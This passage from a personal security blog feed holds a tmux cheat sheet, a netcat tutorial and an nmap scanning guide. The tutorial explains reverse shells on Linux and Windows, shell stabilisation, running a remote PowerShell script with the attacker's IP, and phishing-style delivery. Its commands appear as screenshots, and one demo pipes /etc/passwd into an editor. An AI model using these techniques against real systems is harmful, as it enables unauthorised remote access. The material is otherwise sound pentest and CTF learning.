&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;see the modification of a file in another window in real time, like a live serve.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tail -f namefile 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;allows us to see the sessions that we have created in tmux and windows that we have created, and we can see what we have done in that session or sale previously.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + a + s 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;another way to view sessions with hierarchy.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + w 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;to see the number of panels in the terminal.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + q  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;delete or kill sessions.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + a + s + enter 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;allows you to move the content of a panel from bottom to top, right or left.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + {} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;permite mover los contenidos de los paneles en el sentido de agujas del reloj.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + o  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If we have made a mistake in putting a command in the window that we don’t want, we can move to another new window and do “prefix + shift 1” to move the other content in the correct window.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + shift + 1 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;use the mouse to size the panels and move windows. To deactivate this option, execute the same shurcut and enter again.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;unify or compact windows with = &lt;strong&gt;&lt;em&gt;“join-pane -s (window we are currently in) 1 -t (and in the window we want to move) 2”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + shift + :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;copy the content of a file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + [ (copy mode), ctrl + espacio (selection mode), alt + w (copy content), prefix + ] (paste content in the clipboard)   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;search for info using filters.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + [ (copy mode) + ctrl + s  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Do window swap, for example if I want window 2 to be in window 1.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + shift + : = &quot;swap-window -s 2(current window) -t 1 (window you want to move)  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;close a session in tmux&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + shift + : = &quot;detach&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;edit-a-file-with-micro-command&quot;&gt;Edit a file with micro command&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /etc/passwd | micro
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Create a script using micro and it will detect the syntax in bash or zsh.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;micro script.sh 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Nafsu Uddin</name></author><category term="tmux" /><category term="linux" /><summary type="html">Tmux is a tool that allows us to divide a terminal in several panels and also to speed up when we are working in the console with different functions and shortcuts.</summary></entry><entry><title type="html">Reverse shell using netcat</title><link href="http://localhost:4000/netcat-reveshell/" rel="alternate" type="text/html" title="Reverse shell using netcat" /><published>2021-11-14T00:00:00+01:00</published><updated>2021-11-14T00:00:00+01:00</updated><id>http://localhost:4000/netcat-reveshell</id><content type="html" xml:base="http://localhost:4000/netcat-reveshell/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/netcat.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to learn how we can reverse shell in every OS, and some netcat commands that can help us when we are pentesting or scanning our environment.&lt;/p&gt;

&lt;p&gt;We are going to learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What is netcat&lt;/li&gt;
  &lt;li&gt;Basics netcat commands&lt;/li&gt;
  &lt;li&gt;Web server in netcat&lt;/li&gt;
  &lt;li&gt;What is reverse shell&lt;/li&gt;
  &lt;li&gt;Create a reverse shell in netcat&lt;/li&gt;
  &lt;li&gt;Reverse shell using scripts and payloads&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-netcat&quot;&gt;What is netcat?&lt;/h2&gt;

&lt;p&gt;Netcat &lt;strong&gt;&lt;em&gt;(The Network Swiss Army knife)&lt;/em&gt;&lt;/strong&gt; it is a command line tool that reads and writes data over network connections using TCP, allows us to open TCP and UDP ports for listening and allows us to scan ports similar to nmap but with some limitations. The main use of this tool is in reverse shell.&lt;/p&gt;

&lt;h2 id=&quot;basics-netcat-commands&quot;&gt;Basics netcat commands&lt;/h2&gt;

&lt;p&gt;On linux systems netcat is installed by default and if it is not installed we use the following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install netcat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In some Windows versions it is not installed by default, so we have to install the file called nc.exe.&lt;/p&gt;

&lt;p&gt;With the &lt;strong&gt;&lt;em&gt;-help&lt;/em&gt;&lt;/strong&gt; parameter we can see the possibilities that netcat offers us and if we want to know more information about each parameter is to use the command &lt;strong&gt;&lt;em&gt;man&lt;/em&gt;&lt;/strong&gt; to see the netcat documentation.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan ports. we can specify port ranges to report if any of those port ranges are open. it doesn’t do a full scan like nmap, but it reports back to the console if the port we specified is open or not.&lt;/p&gt;

&lt;p&gt;With the parameter &lt;strong&gt;&lt;em&gt;-z&lt;/em&gt;&lt;/strong&gt; we indicate that we only search for open ports, without sending any data.&lt;/p&gt;

&lt;p&gt;The parameter &lt;strong&gt;&lt;em&gt;-n&lt;/em&gt;&lt;/strong&gt; we indicate only ip adress, no dns names.&lt;/p&gt;

&lt;p&gt;The parameter &lt;strong&gt;&lt;em&gt;-v&lt;/em&gt;&lt;/strong&gt; it’s for verbose, that we tell it to report back to us everything that is happening on the console.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the &lt;strong&gt;&lt;em&gt;-u&lt;/em&gt;&lt;/strong&gt; parameter we specify that we want to scan udp ports.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/udp.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can specify that only ports that are open or successful will be reported by the console with the command &lt;strong&gt;&lt;em&gt;grep&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Netcat allows us to communicate with client machines via tcp, as if it were a kind of chat to communicate.&lt;/p&gt;

&lt;p&gt;On the attacker’s machine I am going to listen on port 5000 with the parameter &lt;strong&gt;&lt;em&gt;-l (listen)&lt;/em&gt;&lt;/strong&gt;. If the client machine is connected to our server it will report us by console and we can send messages.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;On the client machine from the terminal with the command &lt;strong&gt;&lt;em&gt;nc&lt;/em&gt;&lt;/strong&gt; we indicate the ip address of the server machine and the port that is listening, which in my case is 5000.&lt;/p&gt;

&lt;p&gt;And we can see that I can see the messages that the server machine is sending me on the client machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura5.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Netcat allows us to do banner grabbing to get relevant information about a specific port or a specific page which service is running, the version, etc. In my case it will be port 80.&lt;/p&gt;

&lt;p&gt;In this case as it is a port that runs http, I indicate with the command &lt;strong&gt;&lt;em&gt;HEAD / HTTP/1.0&lt;/em&gt;&lt;/strong&gt; that I want information about this service. If it returns &lt;strong&gt;&lt;em&gt;200 ok&lt;/em&gt;&lt;/strong&gt; it means that the scan has been done correctly and we can see that it reports the version of this service, the day it was created, etc. And this as attackers allows us to find possible exploits that may have a port.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If it does not work with “HTTP/1.0” or is not reporting concrete information on port 80, we can use the command &lt;strong&gt;&lt;em&gt;/HEAD /HTTP/1.1&lt;/em&gt;&lt;/strong&gt;. This is because the http port may be running http 1.1.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Another famous use of netcat is to be able to transfer files over the network via tcp. although this is insecure as we can do the same thing via ssh. but it is another alternative to be able to transfer files over the network fast wey.&lt;/p&gt;

&lt;p&gt;So in this case i am gon a create a file with the following massege, and I am going to listen on port 4444 specifying with &lt;strong&gt;&lt;em&gt;”&amp;lt;”&lt;/em&gt;&lt;/strong&gt; that i want to transfer this file when a machine wants to connect to me on port 4444.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;On the client machine who will receive the file, we will specify with parameter &lt;strong&gt;&lt;em&gt;-w&lt;/em&gt;&lt;/strong&gt; is to wait 2 seconds before canceling the transfer if there is a loss of connection, we specify the ip address and the port of the server machine, and with “&amp;gt;” we specify that we are going to receive the file indicating the name of that file. As we can see that on the client machine the file has been received correctly and we can view the contents of the file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;what-is-a-reverse-shell&quot;&gt;What is a reverse shell?&lt;/h2&gt;

&lt;p&gt;A reverse shell consists of creating a remote connection from the shell of the victim machine to the attacker’s machine, reverse shell is the concept of access to the victim’s shell with the ip address.&lt;/p&gt;

&lt;p&gt;For example, in our local network there is a router that inside has the firewall configured and we as attackers it is difficult to try to access the network because it is protected by the firewall. Then our objective is to access remotely on the victim machine, for example, I want to access through the terminal or shell to do things through commands, but the firewall protects us by denying those types of access. Then we can make the victim connect to us to remotely access his terminal, this concept is known as reverse shell.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/reverse.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;create-a-reverse-shell-in-netcat&quot;&gt;Create a reverse shell in netcat&lt;/h2&gt;

&lt;p&gt;So what we would do with netcat is that the victim connects on the attacker’s machine on port 4444 via tcp. and on the victim machine we will connect via netcat with the ip address specifying the port that we have chosen on the attacker’s machine and with the parameter “-e “ we make it return a shell in this case bash on the attacker’s machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the attacker we are going to listen in on the port 4444.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura11.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in the victim machine in my case can’t not run the parameter “-e” and this happens because this parameter is insecure and there are some OS that you can not run this parameter, so I had to use some bash parameters to connect to the attacker’s machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;As we can see in the attacker’s machine we are already connected to the shell of the victim machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can indicate using script in bash to spawn a pseudo console to be able to use ctrl-c, ctrl v, to be able to handle us more comfortably in the remote shell.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We do ctrl-z, type the following command and type “reset” to reset the terminal configuration.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura15.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;we export two environment variables, so that we can use the terminal comfortably, like in ssh.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura16.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The other option is that we can execute this command on the victim machine to connect from the attacking machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura17.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And the above command allows us to connect to the shell of the victim machine and automatically the pseudo console is applied to us.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura18.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell-in-windows&quot;&gt;Reverse shell in windows&lt;/h2&gt;

&lt;p&gt;On the attacking machine we listen in on port 8888 via TCP.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura19.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We perform the following command on the victim machine, with the parameter -e we are indicating the type of shell that we are going to report on the attacker’s machine, in this case being windows we will put &lt;strong&gt;&lt;em&gt;cmd.exe&lt;/em&gt;&lt;/strong&gt;, we see that it reports me in the terminal that the port 8888 is open. It is important to mention that windows by default does not have netcat installed so we have to look for the netcat executable which is “nc.exe”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura20.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And on the attacker’s machine we already have shell access to the windows machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura21.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell-using-scripts-and-payloads&quot;&gt;Reverse shell using scripts and payloads&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;If we are attackers, how can we make the victim be able to execute these types of commands on his computer? or it could also be that he does not have netcat installed on his computer.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To do this there are a lot of scripts that we can run on the victim’s machine. An example we can send the victim a malicious email that he press a button and the script runs automatically and we can gain access as attackers. This term is known as RAT (remote administration tool) is a method that hackers use to remotely access to the victim’s machine, but i will cover this in the another article, since here we are talking about reverse shell.&lt;/p&gt;

&lt;p&gt;For example in my case I am going to run a script on the victim machine so that I can access the powershell of the victim machine on my attacker machine. So on the attacker’s machine I am going to listen on port 3001.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To provide the size of the terminal on the attacking machine we are going to execute the following command to know the size of our terminal. and this command varies if we put the terminal minimized or in full window.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura25.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the victim machine in the powershell I am executing the script. Basically what I’m doing is to say that I want to run the following script that is in github, with the parameter &lt;strong&gt;&lt;em&gt;remoteip&lt;/em&gt;&lt;/strong&gt; I indicate the ip of the attacking machine and with the parameter &lt;strong&gt;&lt;em&gt;remoteport&lt;/em&gt;&lt;/strong&gt; I indicate the port that is listening, which is my case is the port 3001. And with the parameter &lt;strong&gt;&lt;em&gt;rows and cols&lt;/em&gt;&lt;/strong&gt; I indicate how I want to display the size of the shell in my attacker terminal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura23.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We do ctrl+z and as before I recommend to use this command so that we can move better in the remote terminal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura26.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see thanks to the previous command that we have executed we can use ctrl + c, to move better in the remote shell from our attacker’s machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-netcat/captura27.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion we have been able to learn how attackers can access our systems in an easier way. and it is also important to know how to use netcat if we are system administrators or are auditing a company and also these techniques are needed to know if we are doing ctf’s in hack the box, tryhackme.&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="netcat" /><category term="Linux" /><category term="reverse shell" /><summary type="html">We are going to learn how we can reverse shell in every OS, and some netcat commands that can help us when we are pentesting or scanning our environment.</summary></entry><entry><title type="html">Scanning network with nmap</title><link href="http://localhost:4000/nmap-guide/" rel="alternate" type="text/html" title="Scanning network with nmap" /><published>2021-11-09T00:00:00+01:00</published><updated>2021-11-09T00:00:00+01:00</updated><id>http://localhost:4000/nmap-guide</id><content type="html" xml:base="http://localhost:4000/nmap-guide/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/nmap.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to learn how to scan a network or a host using nmap, we are going to see some simple nmap commands and commands that help us to pentest, and we are going to use some nmap scripts to speed up the scanning process.&lt;/p&gt;

&lt;p&gt;We are going to cover:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What is nmap&lt;/li&gt;
  &lt;li&gt;Basics commands and parameters with nmap&lt;/li&gt;
  &lt;li&gt;Difference between TCP connect scan and SYN scan&lt;/li&gt;
  &lt;li&gt;Nmap script&lt;/li&gt;
  &lt;li&gt;Useful set of parameters&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-nmap&quot;&gt;What is nmap?&lt;/h2&gt;

&lt;p&gt;Nmap is a very powerful tool that allows us to scan networks and hots to detect possible ports that are open or vulnerable, and also this tool will be very helpful if we are learning pentest or if you want become a hacker. we can use nmap in windows, mac and linux in my case i going to use in linux, but the commands it’s the same in others OS.&lt;/p&gt;

&lt;h2 id=&quot;basics-commands-and-parameters-with-nmap&quot;&gt;Basics commands and parameters with nmap&lt;/h2&gt;

&lt;p&gt;Use the command “nmap -help” to see the parameters and options offered by nmap, or you can use the command “man nmap” to see the full documentation.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Using nmap commands:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmap [Scan Type(s)] [Options] {target specification}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is a basic scan to find all open ports and running services (this scan is not very good if we want to speed up the process and we will make a lot of noise on the network if we are attackers).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can do the same scan with the domain name.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we want to report information about the machine in the scanning process we will use the parameter “-v” (from verbose). it is advisable to use this parameter to not wait for the scan to finish and meanwhile we can speed up the work.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we do a triple verbose we will get more information about the machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura5.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can scan several hots by puting the ip.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can perform the same scan of several hosts using the last octet of the ip address.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Escaneo de una subred, nos reporta los puertos abiertos de esa subred y los equipos que están activos en esa subred. (hay que recordar si hacemos estos tipos de escaneo vamos a hacer más ruido en la red)&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scanning with a range of ip addresses.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan the list of hosts that are in a file. In my case what i created a file and indicate the ip address, the localhost and the dns of htb.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we will use the parameter “-iL (Input from hosts/network list)” and specify the file that we have created, to scan all IP addresses that we specify in the file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura11.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan the OS used by the target machine with the parameter “-O (os detection)”. First what it has done is to ping the host and then it has used the 3 wey handshake to discover the ports, and below we can see that it is a linux machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the “-A” parameter it shows more information about the machine’s OS. this parameter is interesting because it shows us the ssh-hostkey that is to authenticate to connect in the ssh protocol, in this case this key is public. and below we can see the traceroute that would be the intermediary nodes where they have passed the packets that we have sent.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan a host to detect if the machine uses packet filters or firewall. In my case it is not filtered.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To view all active hosts within the subnet, this command allows you to ping all hosts on the subnet.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura15.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Print hotspot interfaces and routes to the terminal. You can find out the host interface and route information with nmap by using the “-iflist” option.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura16.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the “-F” parameter we indicate that we want a fast scan, but I don’t recommend to use this option as I will show better options for fast scanning below.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura26.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan ports consecutively with the “-r (Scan ports consecutively, do not randomize)” parameter.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura27.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan udp port&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura28.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan and view the versions of different services running on each port.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura29.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the “-sN” parameter we do a null scan via tcp to fool the firewall. And it reports us by consala if the ports are filtered or not, by the firewall.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura32.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can specify if we want the scan to go faster by setting a timer templet “-T4”. The maximum is 5 but obviously if we want to go faster we will make more noise on the network.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura33.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the parameter “-n” we indicate that we do not want dns resolution, by default nmap applies the dns resolution and that is why we must specify it because there are times that the dns resolution takes more than 1 min and this makes the scan take longer.&lt;/p&gt;

&lt;p&gt;With the parameter “-Pn (no ping)” we indicate that we do not want to discover hosts, in case we are only interested in the ports that are open, and this helps us to speed up the scanning process.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura35.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the “-sL (list scan)” parameter, simply list the targets to scan.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura36.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan remote hosts using TCP ACK (TA) and TCP SYN (TS). These types of parameters are used when the firewall blocks standard ICMP ping requests, in which case you can use these two methods to scan remote hotspots.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura30.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The same with the “-PA” paremeter of “ack” to port spool hosts by specifying the ports, but sending “ack” packet.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura31.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Also nmap allows us to export the evidences in a file with certain parameters, depending on the parameter we use it has certain formats. We have to indicate these parameters after indicating the ip address and put the name of the file from where we want to export the evidences.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura41.png&quot; /&gt;
&lt;/p&gt;

